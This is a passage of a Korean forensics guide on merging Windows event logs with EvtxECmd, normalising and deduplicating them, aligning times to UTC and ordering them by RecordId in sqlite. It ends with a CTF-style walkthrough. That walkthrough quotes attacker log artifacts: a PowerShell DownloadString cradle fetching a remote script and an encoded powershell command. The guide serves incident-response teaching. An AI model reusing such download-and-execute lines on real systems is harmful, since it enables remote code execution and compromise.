+<div class="table-wrap"><table><thead><tr><th>컬럼</th><th>쓰임</th></tr></thead><tbody><tr><td><code>TimeCreated</code> / <code>TimeUTC</code></td><td>1차 정렬 키. <strong>UTC</strong></td></tr><tr><td><code>Channel</code></td><td>2차 정렬 키이자 <code>RecordId</code> 의 유효 범위</td></tr><tr><td><code>EventRecordId</code> / <code>RecordId</code></td><td>3차 정렬 키. <code>[int64]</code> 캐스팅 필수</td></tr><tr><td><code>EventId</code></td><td>필터의 주력</td></tr><tr><td><code>Computer</code></td><td>로그를 남긴 호스트. 여러 호스트를 합쳤을 때 필수</td></tr><tr><td><code>Provider</code></td><td>같은 Event ID를 다른 공급자가 쓰는 경우의 구분</td></tr><tr><td><code>Payload</code></td><td><strong>조인과 필터의 근거.</strong> 원본 EventData JSON</td></tr><tr><td><code>MapDescription</code></td><td>사람이 읽는 요약. 없을 수 있다</td></tr><tr><td><code>UserName</code> / <code>RemoteHost</code></td><td>편의 컬럼. payload로 확인</td></tr><tr><td><code>SourceFile</code></td><td>중복 원인 추적</td></tr></tbody></table></div>
+<h2 id="pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</h2>
+<div class="table-wrap"><table><thead><tr><th>여기서 얻은 것</th><th>다음 목표</th><th>무엇을 확인하나</th></tr></thead><tbody><tr><td>채널 분포</td><td>건수가 많은 채널</td><td>어디에 정보가 있는지</td></tr><tr><td>통합·정렬된 CSV</td><td>공격 단계별 Event ID (FOR-0108)</td><td>침해 시나리오</td></tr><tr><td><code>Payload</code> 의 Logon ID</td><td>세션 조인 (FOR-0104)</td><td>세션별 활동표</td></tr><tr><td><code>Payload</code> 의 PID</td><td>프로세스 계보 (FOR-0105)</td><td>실행 흐름</td></tr><tr><td><code>Payload</code> 의 IP/계정</td><td>3축 pivot (FOR-0106)</td><td>공격자 단말</td></tr><tr><td>채널별 첫/마지막 <code>RecordId</code></td><td>로그 보존 구간 (FOR-0103)</td><td>관측 가능 구간</td></tr><tr><td>사건 시각 창</td><td><code>$MFT</code> / <code>$J</code> (<a href="./ntfs-artifact-timeline.html">FOR-0050</a>)</td><td>디스크 측 사건</td></tr><tr><td>문자열 검색이 필요할 때</td><td><code>Select-String</code> (<a href="./powershell-select-string.html">FOR-0121</a>)</td><td>payload 원문 grep</td></tr></tbody></table></div>
+<h2 id="흔한-함정">흔한 함정</h2>
+<ul><li><strong><code>PayloadData1</code> 로 필터하는 것.</strong> 이 컬럼의 의미는 이벤트마다 다르다. 4624에서는 Logon Type, 7045에서는 서비스 이름이 들어간다. → 필터와 조인은 <code>Payload</code> 로 한다.</li><li><strong><code>Channel</code> 컬럼을 버리는 것.</strong> <code>RecordId</code> 의 유효 범위가 사라지고, 정렬 근거도 사라진다. → 정규화 CSV에 반드시 남긴다.</li><li><strong><code>Get-WinEvent</code> 결과와 EvtxECmd CSV를 같은 표에 섞는 것.</strong> 앞은 로컬 시각, 뒤는 UTC다. 9시간 어긋난다. → <code>ToUniversalTime()</code> 으로 맞춘다.</li><li><strong>시각으로만 정렬하는 것.</strong> 같은 초에서 순서가 무작위가 된다. → <code>TimeUTC</code> → <code>Channel</code> → <code>RecordId</code> 3단 정렬.</li><li><strong>채널이 다른 두 행을 <code>RecordId</code> 로 비교하는 것.</strong> 번호는 채널별로 독립이다. → 채널 간 순서는 시각과 인과로 정한다.</li><li><strong><code>ForwardedEvents</code> 를 중복으로 지우는 것.</strong> 다른 호스트의 이벤트다. → <code>Computer</code> 로 분리해서 남긴다.</li><li><strong><code>Archive-*.evtx</code> 중복을 방치하는 것.</strong> 개수 집계와 gap 판정이 전부 틀어진다. → <code>Channel</code> + <code>RecordId</code> 로 제거한다.</li><li><strong>4697(Security)과 7045(System)를 중복으로 지우는 것.</strong> 같은 사건의 서로 다른 기록이며 교차검증 재료다. → 남긴다.</li><li><strong>pandas에서 <code>dtype=str</code> 을 빼는 것.</strong> <code>EventRecordId</code> 가 float로 읽혀 값이 변형되고, <code>0x...</code> 값이 NaN이 된다. → 항상 <code>dtype=str</code>.</li><li><strong>Excel로 CSV를 열어 다시 저장하는 것.</strong> <code>0x</code> 값과 큰 정수가 변형된다. → Timeline Explorer를 쓴다.</li><li><strong><code>--inc</code> 로 뽑은 CSV로 gap을 판정하는 것.</strong> 번호가 당연히 빈다. → gap 판정용은 필터 없이 별도로 뽑는다 (FOR-0103).</li><li><strong>sqlite에 인덱스 없이 반복 질의하는 것.</strong> 수백만 행에서 매 질의가 전체 스캔이다. → <code>Channel, RecordId</code> / <code>TimeUTC</code> / <code>EventId</code> 인덱스를 먼저 만든다.</li><li><strong>KST 변환을 중간 단계에서 하는 것.</strong> 일부는 UTC, 일부는 KST가 되어 정렬이 뒤집힌다. → 마지막 제출 단계에서만 +9시간.</li></ul>
+<h2 id="교차검증">교차검증</h2>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 1) 원본 파일 개수와 CSV 의 SourceFile 종류가 맞는가 (누락 검사)
+(Get-ChildItem &#39;C:\case\winevt\*.evtx&#39;).Count
+(Import-Csv &#39;C:\case\out\all.csv&#39; | Select-Object -ExpandProperty SourceFile | Sort-Object -Unique).Count
+
+# 2) 채널별 건수를 원본과 대조 (한 채널만 표본 검사)
+(Get-WinEvent -Path &#39;C:\case\Security.evtx&#39; -Oldest | Measure-Object).Count
+(Import-Csv &#39;C:\case\out\all.csv&#39; | Where-Object { $_.Channel -eq &#39;Security&#39; } | Measure-Object).Count
+
+# 3) 채널별 첫/마지막 레코드 번호와 시각
+Import-Csv &#39;C:\case\out\all.csv&#39; | Group-Object Channel | ForEach-Object {
+  $g = $_.Group | Sort-Object { [int64]$_.EventRecordId }
+  [pscustomobject]@{
+    Channel = $_.Name; Count = $_.Count
+    FirstId = $g[0].EventRecordId;  FirstTime = $g[0].TimeCreated
+    LastId  = $g[-1].EventRecordId; LastTime  = $g[-1].TimeCreated
+  }
+} | Format-Table -AutoSize
+
+# 4) 중복이 남아 있는가
+Import-Csv &#39;C:\case\out\evtx_dedup.csv&#39; | Group-Object Channel, RecordId |
+  Where-Object { $_.Count -gt 1 } | Measure-Object | Select-Object Count</code></pre></div>
+<div class="code-block" data-lang="sql"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-sql">-- 5) sqlite 로 넣은 뒤 행 수가 CSV 와 같은가
+SELECT COUNT(*) FROM evtx;
+SELECT Channel, COUNT(*) FROM evtx GROUP BY Channel;</code></pre></div>
+<p>1번의 두 숫자가 다르면 파서가 읽지 못한 파일이 있다. EvtxECmd 콘솔 출력의 오류 메시지를 확인한다.</p>
+<h2 id="mini-walkthrough">mini walkthrough</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">문제:
+&quot;침해 호스트에서 수집한 winevt 폴더입니다.
+ PowerShell 로 실행된 다운로더의 URL 과 그 직전 프로세스 생성 시각을
+ KST 로 답하세요.
+ 첨부: winevt/ (evtx 14개, 합 412MB)&quot;
+
+1. 한 번에 뽑는다
+   EvtxECmd.exe -d &#39;C:\case\winevt&#39; --csv &#39;C:\case\out&#39; --csvf all.csv
+   -&gt; 1,384,902 행
+
+2. 첫 시도 (실패):
+   Excel 로 all.csv 를 열어 보려 했다.
+   -&gt; 100만 행이 넘어 잘리고, EventRecordId 가 1.18E+06 으로 표시됐다.
+      0x1a2b3c 는 셀에 그대로 남았지만 일부 값이 날짜로 변환됐다.
+
+   무엇이 틀렸나:
+     CSV 는 Excel 로 열면 안 된다. 행 한계와 자동 형식 변환이 데이터를 바꾼다.
+     이후 그 파일을 저장했다면 원본 CSV 가 오염된다.
+   =&gt; all.csv 를 다시 뽑고, 이후로는 Excel 을 열지 않았다.
+
+3. 채널 분포부터 본다
+   Import-Csv out\all.csv | Group-Object Channel | Sort Count -Desc
+
+   Security                                 82,364
+   Microsoft-Windows-Sysmon/Operational  1,241,088
+   System                                   12,844
+   Microsoft-Windows-PowerShell/Operational  3,418
+   ...
+
+   Sysmon 이 124만 행이다. PowerShell 채널은 3,418 행 -&gt; 여기서 시작한다.
+
+4. 두 번째 시도 (실패):
+   PowerShell 채널을 PayloadData1 로 필터해 스크립트 본문을 찾으려 했다.
+
+   Import-Csv out\all.csv |
+     Where-Object { $_.Channel -like &#39;*PowerShell*&#39; -and $_.PayloadData1 -match &#39;http&#39; }
+   -&gt; 0건.
+
+   무엇이 틀렸나:
+     4104 의 ScriptBlockText 는 PayloadData1 에 들어가지 않는다.
+     맵이 뽑아 주는 필드는 이벤트마다 다르고, 긴 본문은 Payload 에만 있다.
+
+   Payload 로 바꾼다:
+   Import-Csv out\all.csv |
+     Where-Object { $_.Channel -like &#39;*PowerShell*&#39; -and $_.Payload -match &#39;http&#39; } |
+     Select-Object TimeCreated, EventId, EventRecordId
+   -&gt; 11건
+
+5. 세 번째 시도 (실패):
+   11건 중 URL 이 있는 4104 를 찾아 시각을 읽고, 그 시각으로 Security 4688 을
+   찾으려 했다. 그런데 4688 이 같은 초에 3건 있어 &quot;직전 프로세스&quot;가 안 정해졌다.
+
+   Sort-Object TimeCreated 로 정렬했더니 매번 순서가 달라졌다.
+
+   무엇이 틀렸나:
+     같은 초 정렬은 시각으로 안 된다. Security 채널 안에서 EventRecordId 로 정렬해야 한다.
+     그리고 4104(PowerShell 채널)와 4688(Security 채널)의 순서는
+     번호로 비교할 수 없다 — 채널이 다르다. 시각과 인과로 정한다.
+
+6. 접근 변경 — sqlite 로 넣고 SQL 로 푼다
+   정규화 CSV 를 만들고 (공통 컬럼 + Payload 보존)
+   sqlite3 case.db &quot;.import --csv C:/case/out/evtx_dedup.csv evtx&quot;
+   CREATE INDEX idx_ch_rec ON evtx(Channel, RecordId);
+   CREATE INDEX idx_time   ON evtx(TimeUTC);
+
+   -- URL 이 있는 4104
+   SELECT TimeUTC, RecordId, substr(Payload, 1, 200)
+   FROM evtx
+   WHERE Channel LIKE &#39;%PowerShell%&#39; AND EventId=&#39;4104&#39; AND Payload LIKE &#39;%http%&#39;
+   ORDER BY TimeUTC;
+
+   TimeUTC                       RecordId  ...
+   2026-03-14 07:20:09           1188      ...DownloadString(&#39;http://203.0.113.77/a.ps1&#39;)...
+
+   -- 그 시각 이전 5초 안의 Security 4688 (채널 내 번호로 정렬)
+   SELECT TimeUTC, RecordId, Summary
+   FROM evtx
+   WHERE Channel=&#39;Security&#39; AND EventId=&#39;4688&#39;
+     AND TimeUTC BETWEEN &#39;2026-03-14 07:20:04&#39; AND &#39;2026-03-14 07:20:09&#39;
+   ORDER BY TimeUTC, CAST(RecordId AS INTEGER);
+
+   TimeUTC              RecordId  Summary
+   2026-03-14 07:20:08  1184574   powershell.exe -enc SQBFAFgA...
+   2026-03-14 07:20:08  1184575   conhost.exe
+   2026-03-14 07:20:08  1184576   (기타)
+
+   RecordId 1184574 가 가장 작다 -&gt; powershell.exe 생성이 직전 사건이다.
+   conhost.exe 는 powershell 이 만든 부수 프로세스다(부모 PID 확인으로 확증).
+
+7. KST 변환
+   SELECT datetime(&#39;2026-03-14 07:20:08&#39;, &#39;+9 hours&#39;);
+   -&gt; 2026-03-14 16:20:08
+
+정답: URL = http://203.0.113.77/a.ps1
+      직전 프로세스 생성 시각 = 2026-03-14 16:20:08 KST
+      (powershell.exe, Security RecordId 1184574)</code></pre></div>
+<p>세 번의 교정이 핵심이다. <strong>① CSV를 Excel로 열면 데이터가 변형된다</strong> — Timeline Explorer/sqlite로 간다. <strong>② 긴 본문은 <code>PayloadData*</code> 가 아니라 <code>Payload</code> 에만 있다.</strong> <strong>③ 같은 초의 순서는 채널 안에서 <code>RecordId</code> 로 정하고, 채널이 다르면 번호 비교 자체가 무효다.</strong></p>
+<h2 id="막혔을-때-다음-체크">막혔을 때 다음 체크</h2>
+<ol><li><code>-d</code> 로 폴더 전체를 한 번에 뽑았는가</li><li><code>Channel</code> 과 <code>Payload</code> 컬럼을 정규화 CSV에 남겼는가</li><li>필터를 <code>PayloadData*</code> 가 아니라 <code>Payload</code> 로 걸었는가</li><li><code>Get-Member</code> 로 실제 컬럼명을 확인했는가</li><li><code>Archive-*.evtx</code> 중복을 <code>Channel</code> + <code>RecordId</code> 로 제거했는가</li><li><code>ForwardedEvents</code> 를 <code>Computer</code> 로 분리했는가</li><li>모든 시각이 UTC인가 (<code>Get-WinEvent</code> 는 로컬이다)</li><li>정렬을 <code>TimeUTC</code> → <code>Channel</code> → <code>RecordId</code> 3단으로 했는가</li><li><code>RecordId</code> 를 <code>[int64]</code> 로 캐스팅했는가</li><li>pandas에서 <code>dtype=str</code> 을 줬는가</li><li>sqlite에 인덱스를 만들었는가</li><li>원본 evtx 개수와 <code>SourceFile</code> 종류 수가 일치하는가</li><li><code>--inc</code> 로 뽑은 CSV로 gap을 판정하고 있지 않은가</li><li>Excel로 CSV를 열지 않았는가</li><li>답 시각을 마지막에만 KST(+9시간)로 바꿨는가</li></ol>
+<h2 id="출처">출처</h2>
+<ul><li>SRC-004 — Eric Zimmerman 문서: EvtxECmd의 <code>-f</code>/<code>-d</code>/<code>--csv</code>/<code>--csvf</code>/<code>--inc</code>/<code>--exc</code>/<code>--json</code> 옵션, CSV 컬럼 구성(<code>EventRecordId</code>, <code>TimeCreated</code>, <code>Channel</code>, <code>Computer</code>, <code>Provider</code>, <code>MapDescription</code>, <code>PayloadData1~6</code>, <code>Payload</code>, <code>SourceFile</code>), 맵 파일이 있는 이벤트만 <code>MapDescription</code> 이 채워진다는 동작, Timeline Explorer의 필터·태깅</li><li>SRC-026 — Libyal libevtx, EVTX 포맷 문서: 레코드 식별자가 파일(채널) 단위로 유일하다는 근거 — 중복 제거 키를 <code>Channel</code> + <code>EventRecordId</code> 로 잡는 이유</li><li>SRC-011 — SQLite 문서: <code>datetime()</code> / <code>strftime()</code> 의 입력 형식(<code>YYYY-MM-DD HH:MM:SS</code>)과 <code>+9 hours</code> 수식자, CSV <code>.import</code> 동작</li><li>EvtxECmd의 옵션 이름(중복 방지·날짜 범위 필터 등)과 CSV 컬럼명은 버전에 따라 다르므로 <code>EvtxECmd.exe</code> 도움말과 <code>Get-Member</code> 결과로 실제 값을 확인할 것</li><li><code>sqlite3</code> 의 <code>.import</code> 문법은 버전에 따라 <code>--csv</code> 플래그 지원 여부가 다르므로 <code>.help import</code> 로 확인할 것</li></ul>
+      </div>
+      <section class="related">
+  <h2>관련 글</h2>
+  <div class="related-grid">
+  <a class="related-item" href="./ntfs-artifact-timeline.html">
+    <span class="rel-id">FOR-0050 · 디스크/NTFS</span>
+    NTFS artifact 종합 타임라인 만들기: $MFT·$J·EVTX·Prefetch를 한 축에
+  </a>
+  <a class="related-item" href="./event-record-id-tracking.html">
+    <span class="rel-id">FOR-0103 · Event Log</span>
+    EventRecordID로 이벤트 순서 확정하기: 같은 초의 인과와 번호 gap 판독
+  </a>
+  <a class="related-item" href="./attack-timeline-from-eventlog.html">
+    <span class="rel-id">FOR-0108 · Event Log</span>
+    Event Log만으로 공격 타임라인 만들기: 침해 단계별 Event ID 지도
+  </a>
+  <a class="related-item" href="./windows-log-ctf-walkthrough.html">
+    <span class="rel-id">FOR-0110 · Event Log</span>
+    Windows 로그 종합 CTF 풀이: RDP 침입부터 로그 삭제까지 4채널 추적
+  </a>
+  </div>
+</section>
+      <div class="pager">
+<a class="related-item" href="./account-ip-workstation-pivot.html"><span class="rel-id">← FOR-0106</span>계정·IP·WorkstationName 3축 pivot: 공격자 단말과 측면 이동 경로 특정</a>
+<a class="related-item" href="./attack-timeline-from-eventlog.html"><span class="rel-id">FOR-0108 →</span>Event Log만으로 공격 타임라인 만들기: 침해 단계별 Event ID 지도</a>
+      </div>
+    </article>
+<aside class="toc">
+  <div class="toc-title">목차</div>
+  <ul>
+<li class="toc-l2"><a href="#한-줄-결론">한 줄 결론</a></li>
+<li class="toc-l2"><a href="#어떤-문제에서-필요한가">어떤 문제에서 필요한가</a></li>
+<li class="toc-l2"><a href="#문제에서-처음-볼-단서">문제에서 처음 볼 단서</a></li>
+<li class="toc-l2"><a href="#30초-절차">30초 절차</a></li>
+<li class="toc-l2"><a href="#상세-절차">상세 절차</a></li>
+<li class="toc-l3"><a href="#1단계-한-번에-뽑는다">1단계 — 한 번에 뽑는다</a></li>
+<li class="toc-l3"><a href="#2단계-채널마다-컬럼이-달라-어긋나는-문제">2단계 — 채널마다 컬럼이 달라 어긋나는 문제</a></li>
+<li class="toc-l3"><a href="#3단계-중복-제거">3단계 — 중복 제거</a></li>
+<li class="toc-l3"><a href="#4단계-시각-기준-통일-가장-중요">4단계 — 시각 기준 통일 (가장 중요)</a></li>
+<li class="toc-l3"><a href="#5단계-같은-초-정렬은-채널별-eventrecordid-로">5단계 — 같은 초 정렬은 채널별 EventRecordId 로</a></li>
+<li class="toc-l3"><a href="#6단계-방법-세-가지-비교">6단계 — 방법 세 가지 비교</a></li>
+<li class="toc-l3"><a href="#7단계-timeline-explorer-활용">7단계 — Timeline Explorer 활용</a></li>
+<li class="toc-l3"><a href="#8단계-대용량-전략">8단계 — 대용량 전략</a></li>
+<li class="toc-l2"><a href="#출력-필드-해석">출력 필드 해석</a></li>
+<li class="toc-l2"><a href="#pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</a></li>
+<li class="toc-l2"><a href="#흔한-함정">흔한 함정</a></li>
+<li class="toc-l2"><a href="#교차검증">교차검증</a></li>
+<li class="toc-l2"><a href="#mini-walkthrough">mini walkthrough</a></li>
+<li class="toc-l2"><a href="#막혔을-때-다음-체크">막혔을 때 다음 체크</a></li>
+<li class="toc-l2"><a href="#출처">출처</a></li>
+  </ul>
+</aside>
+  </div>
+</main>
+<footer class="site-footer">
+  완전 오프라인 · 인터넷/CDN 없음 · build 2026-09-10 08:40 KST
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/search-core.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
